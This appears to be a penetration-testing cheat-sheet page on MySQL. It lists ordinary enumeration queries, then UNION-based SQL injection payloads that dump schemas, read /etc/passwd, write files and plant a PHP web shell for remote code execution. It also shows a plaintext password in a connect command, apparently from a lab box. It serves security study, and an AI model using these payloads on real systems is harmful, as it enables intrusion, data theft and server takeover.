---
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# MySQL (3306)

## Usage

{% tabs %}
{% tab title="Version" %}
```sql
SELECT version();
```
{% endtab %}

{% tab title="Current User" %}
```sql
SELECT current_user();
SELECT user();
SELECT system_user();
```
{% endtab %}

{% tab title="Databases" %}
```sql
SHOW databases;
```
{% endtab %}

{% tab title="Tables" %}
```sql
SHOW tables FROM <database>;
```
{% endtab %}
{% endtabs %}

MySQL stores information about itself in the [`information_schema`](https://dev.mysql.com/doc/refman/8.4/en/information-schema.html) database, which is a read-only repository of the metadata of the MySQL database server, providing insights into the structure and organization of the database environment. It contains some useful tables, such as:

1. [`schemata`](https://dev.mysql.com/doc/refman/8.4/en/information-schema-schemata-table.html) **->** Information about all databases.
2. [`tables`](https://dev.mysql.com/doc/refman/8.4/en/information-schema-tables-table.html) -> Information about all tables.
3. [`columns`](https://dev.mysql.com/doc/refman/8.4/en/information-schema-columns-table.html) -> Details about columns in the tables.

We can use the following `SELECT`-based queries to enumerate the DBMS via the `information_schema` database.

{% tabs %}
{% tab title="Databases" %}
```sql
SELECT table_schema FROM information_schema.tables GROUP BY table_schema;
```
{% endtab %}

{% tab title="Tables" %}
```sql
SELECT table_name FROM information_schema.tables WHERE table_schema='<table>';
```
{% endtab %}

{% tab title="Columns" %}
{% code overflow="wrap" %}
```sql
SELECT column_name, data_type FROM information_schema.columns WHERE table_schema = '<database>' AND table_name = '<table>';
```
{% endcode %}
{% endtab %}
{% endtabs %}

We can connect through Linux via `mysql`.

{% tabs %}
{% tab title="Connect" %}
```bash
mysql -h localhost -u lewis -pP4ntherg0t1n5r3c0n##
```
{% endtab %}
{% endtabs %}

For an example of MySQL usage see [Devvortex](../../boxes/easy/devvortex.md).

## SQLi

### Enumeration

{% hint style="info" %}
The `INFORMATION_SCHEMA` database contains metadata about the server databases and tables. Its `SCHEMATA` table contains information about all server databases.
{% endhint %}

{% hint style="danger" %}
On the below commands, the comment at the end includes a space: `--` ! The `#` symbol can also be used.
{% endhint %}

{% tabs %}
{% tab title="DBs" %}
```bash
a' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- 
```
{% endtab %}

{% tab title="Current DB" %}
```bash
a' UNION select 1,database(),2,3-- 
```
{% endtab %}

{% tab title="Tables" %}
{% code overflow="wrap" %}
```bash
a' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='db1'-- 
```
{% endcode %}
{% endtab %}

{% tab title="Columns" %}
{% code overflow="wrap" %}
```bash
a' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='table1'-- 
```
{% endcode %}
{% endtab %}

{% tab title="Data" %}
```bash
a' ' UNION select 1, col1, col2, 4 from db1.table1-- 
```
{% endtab %}
{% endtabs %}

### Read/Write

{% hint style="info" %}
The `FILE` privilege is needed to both `read` and `write` files.
{% endhint %}

MySQL has a `secure_file_priv` system variable that restricts which directories can be used to `read` or `write` files.

| SECURE\_FILE\_PRIV value | PERMISSIONS                             |
| ------------------------ | --------------------------------------- |
|                          | Read files from anywhere.               |
| random\_directory        | Only read from the specified directory. |
| NULL                     | Cannot read/write anywhere.             |

Thus, we first need to enumerate `secure_file_priv`'s value.

```sql
SELECT @@GLOBAL.secure_file_priv;
```

We can use the `INTO OUTFILE '<file>'` clause to write a file (the file location must be writable to the OS user the database software is running as). For example, if the `secure_file_priv` is set to the `/var/lib/mysql-files` directory, we can only `write` a file within that folder.

```sql
SELECT * FROM users INTO OUTFILE '/var/lib/mysql-files/test.txt'
```

To read the above file, we can use the `LOAD_FILE('<file>')` clause.

```sql
SELECT LOAD_FILE('/var/lib/mysqlfiles/test.txt')
```

Some `UNION`-based payload can be found below.

{% tabs %}
{% tab title="User" %}
```bash
a' UNION SELECT 1, user(), 3, 4-- 
a' UNION SELECT 1, user, 3, 4 from mysql.user-- 
```
{% endtab %}

{% tab title="Privileges" %}
{% code overflow="wrap" %}
```bash
a' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges WHERE grantee="user1"-- 
```
{% endcode %}
{% endtab %}

{% tab title="SUPER_PRIV" %}
```bash
a' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user="user1"-- 
```
{% endtab %}

{% tab title="READ" %}
```bash
a' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- 
```
{% endtab %}
{% endtabs %}

To **WRITE** files the `FILE` privilege is required as well as the `secure_file_priv` variable must be disabled. In addition, the user must have `write` access to the location we want to write to.

{% tabs %}
{% tab title="SECURE_FILE_PRIV" %}
{% code overflow="wrap" %}
```bash
a' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv"--  
```
{% endcode %}
{% endtab %}

{% tab title="WRITE" %}
{% code overflow="wrap" %}
```bash
a' union select 1,'textToBeWritten',3,4 into outfile '/var/www/html/proof.txt'-- 
```
{% endcode %}
{% endtab %}

{% tab title="RCE" %}
{% code overflow="wrap" %}
```bash
a' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- 
```
{% endcode %}
{% endtab %}
{% endtabs %}

To write a webshell, we must know the **webroot**. We can find it is by using `load_file` to read the server configuration:

<table><thead><tr><th width="144">Server</th><th>Directory</th></tr></thead><tbody><tr><td>Apache</td><td>/etc/apache2/apache2.conf</td></tr><tr><td>Nginx</td><td>/etc/nginx/nginx.conf</td></tr><tr><td>ISS</td><td>$WinDir%\System32\Inetsrv\Config\ApplicationHost.config</td></tr></tbody></table>

For an example of a manual SQLi attack on a MySQL database, see [here](../../tl-dr/web/injections/sqli/in-band.md#union-attack).

## Resources

{% tabs %}
{% tab title="Man" %}
{% embed url="https://linux.die.net/man/1/mysql" %}
{% endtab %}

{% tab title="CheatSheet" %}
{% embed url="https://devhints.io/mysql" %}
{% endtab %}
{% endtabs %}
